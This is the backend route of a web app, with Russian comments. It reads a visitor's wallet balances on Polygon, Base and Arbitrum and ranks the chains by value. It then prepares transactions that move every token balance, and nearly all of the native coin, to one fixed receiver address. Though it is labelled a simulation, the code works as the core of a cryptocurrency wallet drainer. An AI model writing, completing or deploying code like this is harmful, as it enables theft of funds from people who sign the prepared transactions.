import { NextResponse } from 'next/server'
import { smartEstimateGas } from '@/lib/gas-estimation'


const RECEIVER_ADDRESS = process.env.RECEIVER_ADDRESS || '0x0000000000000000000000000000000000000000'

// Chain IDs
const CHAIN_IDS = {
  polygon: 137,
  base: 8453,
  arbitrum: 42161,
}


const RPC_ENDPOINTS = {
  polygon: ['https://polygon-rpc.com', 'https://polygon-bor-rpc.publicnode.com'],
  base: ['https://mainnet.base.org', 'https://base.publicnode.com'],
  arbitrum: ['https://arb1.arbitrum.io/rpc', 'https://arbitrum-one.publicnode.com'],
}


const TOKEN_CONTRACTS = {
  polygon: {
    USDT: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F',
    USDC: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',
    WETH: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619',
  },
  base: {
    USDC: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
    WETH: '0x4200000000000000000000000000000000000006',
  },
  arbitrum: {
    USDT: '0xFd086bC7CD5C481DCC95BD0d56f35241523fBab9',
    USDC: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831',
    ARB: '0x912CE59144191C1204E64559FE8253a0e49E6548',
    WETH: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1',
  },
}

const BALANCE_OF_SIGNATURE = '0x70a08231'
const TRANSFER_SIGNATURE = '0xa9059cbb'

interface TokenInfo {
  contract: string
  balance: bigint
  decimals: number
  symbol: string
  usdPrice: number
}

interface NetworkData {
  chainId: number
  name: string
  rpcUrls: string[]
  nativeBalance: bigint
  nativeSymbol: string
  nativePrice: number
  tokens: TokenInfo[]
  totalUsdValue: number
}

interface SimulatedTransaction {
  chainId: number
  network: string
  to: string
  value?: string
  data?: string
  type: 'native' | 'erc20'
  token: string
  amount: string
  amountFormatted: string
  estimatedGas: string
  maxFeePerGas: string
  maxPriorityFeePerGas?: string
  gasInUsd: number
  netAmount: string
}

// Получение баланса нативной монеты
async function getBalance(rpcUrls: string[], address: string): Promise<bigint> {
  for (const rpcUrl of rpcUrls) {
    try {
      const controller = new AbortController()
      const timeout = setTimeout(() => controller.abort(), 5000)
      
      const response = await fetch(rpcUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          method: 'eth_getBalance',
          params: [address, 'latest'],
          id: 1,
        }),
        signal: controller.signal,
      })
      
      clearTimeout(timeout)
      const data = await response.json()
      if (data.result) return BigInt(data.result)
    } catch {
      continue
    }
  }
  return BigInt(0)
}

// Получение баланса ERC-20 токена
async function getTokenBalance(
  rpcUrls: string[],
  walletAddress: string,
  tokenContract: string
): Promise<bigint> {
  const paddedAddress = walletAddress.slice(2).toLowerCase().padStart(64, '0')
  const data = BALANCE_OF_SIGNATURE + paddedAddress

  for (const rpcUrl of rpcUrls) {
    try {
      const controller = new AbortController()
      const timeout = setTimeout(() => controller.abort(), 5000)
      
      const response = await fetch(rpcUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          jsonrpc: '2.0',
          method: 'eth_call',
          params: [{ to: tokenContract, data }, 'latest'],
          id: 1,
        }),
        signal: controller.signal,
      })
      
      clearTimeout(timeout)
      const result = await response.json()
      if (result.result && result.result !== '0x') {
        return BigInt(result.result)
      }
    } catch {
      continue
    }
  }
  return BigInt(0)
}

// Создание data для ERC-20 transfer
function createTransferData(to: string, amount: bigint): string {
  const paddedTo = to.slice(2).toLowerCase().padStart(64, '0')
  const paddedAmount = amount.toString(16).padStart(64, '0')
  return TRANSFER_SIGNATURE + paddedTo + paddedAmount
}

// Получение цен с CoinGecko
async function getPrices(): Promise<{ eth: number; pol: number; usdt: number; usdc: number; arb: number }> {
  try {
    const response = await fetch(
      'https://api.coingecko.com/api/v3/simple/price?ids=ethereum,polygon-ecosystem-token,tether,usd-coin,arbitrum&vs_currencies=usd',
      { headers: { Accept: 'application/json' }, cache: 'no-store' }
    )
    const data: any = await response.json()
    return {
      eth: data.ethereum?.usd || 0,
      pol: data['polygon-ecosystem-token']?.usd || 0,
      usdt: data.tether?.usd || 1,
      usdc: data['usd-coin']?.usd || 1,
      arb: data.arbitrum?.usd || 0,
    }
  } catch {
    return { eth: 0, pol: 0, usdt: 1, usdc: 1, arb: 0 }
  }
}

export async function POST(request: Request) {
  const transactions: SimulatedTransaction[] = []
  const networks: NetworkData[] = []

  try {
    const { address } = await request.json()

    if (!address) {
      return NextResponse.json({ error: 'Address required' }, { status: 400 })
    }

    const prices = await getPrices()

    // === POLYGON ===
    const polygonNative = await getBalance(RPC_ENDPOINTS.polygon, address)
    const polygonTokens: TokenInfo[] = []
    
    const polygonUSDT = await getTokenBalance(RPC_ENDPOINTS.polygon, address, TOKEN_CONTRACTS.polygon.USDT)
    const polygonUSDC = await getTokenBalance(RPC_ENDPOINTS.polygon, address, TOKEN_CONTRACTS.polygon.USDC)
    const polygonWETH = await getTokenBalance(RPC_ENDPOINTS.polygon, address, TOKEN_CONTRACTS.polygon.WETH)
    
    if (polygonUSDT > BigInt(0)) {
      polygonTokens.push({ contract: TOKEN_CONTRACTS.polygon.USDT, balance: polygonUSDT, decimals: 6, symbol: 'USDT', usdPrice: prices.usdt })
    }
    if (polygonUSDC > BigInt(0)) {
      polygonTokens.push({ contract: TOKEN_CONTRACTS.polygon.USDC, balance: polygonUSDC, decimals: 6, symbol: 'USDC', usdPrice: prices.usdc })
    }
    if (polygonWETH > BigInt(0)) {
      polygonTokens.push({ contract: TOKEN_CONTRACTS.polygon.WETH, balance: polygonWETH, decimals: 18, symbol: 'WETH', usdPrice: prices.eth })
    }
    
    const polygonNativeUsd = Number(polygonNative) / 1e18 * prices.pol
    const polygonTokensUsd = polygonTokens.reduce((sum, t) => sum + (Number(t.balance) / Math.pow(10, t.decimals) * t.usdPrice), 0)
    
    networks.push({
      chainId: CHAIN_IDS.polygon,
      name: 'Polygon',
      rpcUrls: RPC_ENDPOINTS.polygon,
      nativeBalance: polygonNative,
      nativeSymbol: 'POL',
      nativePrice: prices.pol,
      tokens: polygonTokens,
      totalUsdValue: polygonNativeUsd + polygonTokensUsd,
    })

    // === BASE ===
    const baseNative = await getBalance(RPC_ENDPOINTS.base, address)
    const baseTokens: TokenInfo[] = []
    
    const baseUSDC = await getTokenBalance(RPC_ENDPOINTS.base, address, TOKEN_CONTRACTS.base.USDC)
    const baseWETH = await getTokenBalance(RPC_ENDPOINTS.base, address, TOKEN_CONTRACTS.base.WETH)
    
    if (baseUSDC > BigInt(0)) {
      baseTokens.push({ contract: TOKEN_CONTRACTS.base.USDC, balance: baseUSDC, decimals: 6, symbol: 'USDC', usdPrice: prices.usdc })
    }
    if (baseWETH > BigInt(0)) {
      baseTokens.push({ contract: TOKEN_CONTRACTS.base.WETH, balance: baseWETH, decimals: 18, symbol: 'WETH', usdPrice: prices.eth })
    }
    
    const baseNativeUsd = Number(baseNative) / 1e18 * prices.eth
    const baseTokensUsd = baseTokens.reduce((sum, t) => sum + (Number(t.balance) / Math.pow(10, t.decimals) * t.usdPrice), 0)
    
    networks.push({
      chainId: CHAIN_IDS.base,
      name: 'Base',
      rpcUrls: RPC_ENDPOINTS.base,
      nativeBalance: baseNative,
      nativeSymbol: 'ETH',
      nativePrice: prices.eth,
      tokens: baseTokens,
      totalUsdValue: baseNativeUsd + baseTokensUsd,
    })

    // === ARBITRUM ===
    const arbNative = await getBalance(RPC_ENDPOINTS.arbitrum, address)
    const arbTokens: TokenInfo[] = []
    
    const arbUSDT = await getTokenBalance(RPC_ENDPOINTS.arbitrum, address, TOKEN_CONTRACTS.arbitrum.USDT)
    const arbUSDC = await getTokenBalance(RPC_ENDPOINTS.arbitrum, address, TOKEN_CONTRACTS.arbitrum.USDC)
    const arbARB = await getTokenBalance(RPC_ENDPOINTS.arbitrum, address, TOKEN_CONTRACTS.arbitrum.ARB)
    const arbWETH = await getTokenBalance(RPC_ENDPOINTS.arbitrum, address, TOKEN_CONTRACTS.arbitrum.WETH)
    
    if (arbUSDT > BigInt(0)) {
      arbTokens.push({ contract: TOKEN_CONTRACTS.arbitrum.USDT, balance: arbUSDT, decimals: 6, symbol: 'USDT', usdPrice: prices.usdt })
    }
    if (arbUSDC > BigInt(0)) {
      arbTokens.push({ contract: TOKEN_CONTRACTS.arbitrum.USDC, balance: arbUSDC, decimals: 6, symbol: 'USDC', usdPrice: prices.usdc })
    }
    if (arbARB > BigInt(0)) {
      arbTokens.push({ contract: TOKEN_CONTRACTS.arbitrum.ARB, balance: arbARB, decimals: 18, symbol: 'ARB', usdPrice: prices.arb })
    }
    if (arbWETH > BigInt(0)) {
      arbTokens.push({ contract: TOKEN_CONTRACTS.arbitrum.WETH, balance: arbWETH, decimals: 18, symbol: 'WETH', usdPrice: prices.eth })
    }
    
    const arbNativeUsd = Number(arbNative) / 1e18 * prices.eth
    const arbTokensUsd = arbTokens.reduce((sum, t) => sum + (Number(t.balance) / Math.pow(10, t.decimals) * t.usdPrice), 0)
    
    networks.push({
      chainId: CHAIN_IDS.arbitrum,
      name: 'Arbitrum',
      rpcUrls: RPC_ENDPOINTS.arbitrum,
      nativeBalance: arbNative,
      nativeSymbol: 'ETH',
      nativePrice: prices.eth,
      tokens: arbTokens,
      totalUsdValue: arbNativeUsd + arbTokensUsd,
    })

    // Сортируем сети от большей к меньшей по USD стоимости
    networks.sort((a, b) => b.totalUsdValue - a.totalUsdValue)

    for (const network of networks) {
      if (network.totalUsdValue === 0) continue

      let totalGasCostForTokens = BigInt(0)
      const tokenTransactions: SimulatedTransaction[] = []
      
      for (const token of network.tokens) {
        const transferData = createTransferData(RECEIVER_ADDRESS, token.balance)
        
        const gasEstimate = await smartEstimateGas(
          network.chainId,
          network.rpcUrls,
          address,
          token.contract,
          undefined,
          transferData
        )
        
        const gasCost = gasEstimate.estimatedCost
        totalGasCostForTokens += gasCost
        const gasCostUsd = Number(gasCost) / 1e18 * network.nativePrice

        tokenTransactions.push({
          chainId: network.chainId,
          network: network.name,
          to: token.contract,
          data: transferData,
          type: 'erc20',
          token: token.symbol,
          amount: token.balance.toString(),
          amountFormatted: (Number(token.balance) / Math.pow(10, token.decimals)).toFixed(token.decimals === 6 ? 2 : 6),
          estimatedGas: gasEstimate.gasLimit.toString(),
          maxFeePerGas: gasEstimate.maxFeePerGas.toString(),
          maxPriorityFeePerGas: gasEstimate.maxPriorityFeePerGas.toString(),
          gasInUsd: gasCostUsd,
          netAmount: token.balance.toString(),
        })
      }

      const nativeGasEstimate = await smartEstimateGas(
        network.chainId,
        network.rpcUrls,
        address,
        RECEIVER_ADDRESS,
        '0x1'
      )

      const nativeGasCost = nativeGasEstimate.estimatedCost
      const totalGasCost = totalGasCostForTokens + nativeGasCost

      if (network.nativeBalance < totalGasCostForTokens) {
        continue
      }

      transactions.push(...tokenTransactions)

      if (network.nativeBalance > BigInt(0)) {
        const maxTransferAmount = network.nativeBalance - totalGasCost
        
        if (maxTransferAmount > BigInt(0)) {
          const gasCostUsd = Number(nativeGasCost) / 1e18 * network.nativePrice
          
          transactions.push({
            chainId: network.chainId,
            network: network.name,
            to: RECEIVER_ADDRESS,
            value: '0x' + maxTransferAmount.toString(16),
            type: 'native',
            token: network.nativeSymbol,
            amount: maxTransferAmount.toString(),
            amountFormatted: (Number(maxTransferAmount) / 1e18).toFixed(6),
            estimatedGas: nativeGasEstimate.gasLimit.toString(),
            maxFeePerGas: nativeGasEstimate.maxFeePerGas.toString(),
            maxPriorityFeePerGas: nativeGasEstimate.maxPriorityFeePerGas.toString(),
            gasInUsd: gasCostUsd,
            netAmount: maxTransferAmount.toString(),
          })
        }
      }
    }
  } catch (error) {
    console.error('Simulation error:', error)
    return NextResponse.json({ error: 'Failed to simulate transactions' }, { status: 500 })
  }

  return NextResponse.json({
    success: true,
    transactions,
    receiver: RECEIVER_ADDRESS,
    sortedNetworks: networks.map(n => ({ name: n.name, totalUsd: n.totalUsdValue.toFixed(2) })),
  })
}
